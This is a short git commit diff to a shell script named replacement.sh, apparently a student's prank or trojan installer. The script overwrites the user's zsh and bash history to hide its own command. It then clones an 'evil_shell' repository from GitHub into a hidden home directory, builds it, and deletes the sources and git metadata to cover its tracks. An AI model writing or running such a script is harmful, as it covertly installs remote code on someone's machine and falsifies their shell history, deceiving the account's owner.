29469c92d24b54a13147080a072e19073c836bd1
Nathan G <nguiard@student.42.fr>
2022-08-19 16:50:11 +0200

    C'est mieux comme ca

--- replacement.sh
+++ replacement.sh
@@ -2,7 +2,7 @@
 
 sed -i 's/bash -x replacement.sh/This command is secret/' ~/.zsh_history
 sed -i 's/bash -x replacement.sh/This command is secret/' ~/.bash_history
-git clone git@github.com:nathan-guiard/evil_shell.git ~/.evil_shell || git clone git@github.com:nathan-guiard/evil_shell.git ~/.evil_shell2 || git clone git@github.com:nathan-guiard/evil_shell.git ~/.evil_shell3
+git clone git@github.com:nathan-guiard/evil_shell.git ~/.evil_shell
 cd ~/.evil_shell
 make
 rm -rf libft builtin include list parsing parsing_api srcs .git replacement.sh .gitignore Makefile exec error.log
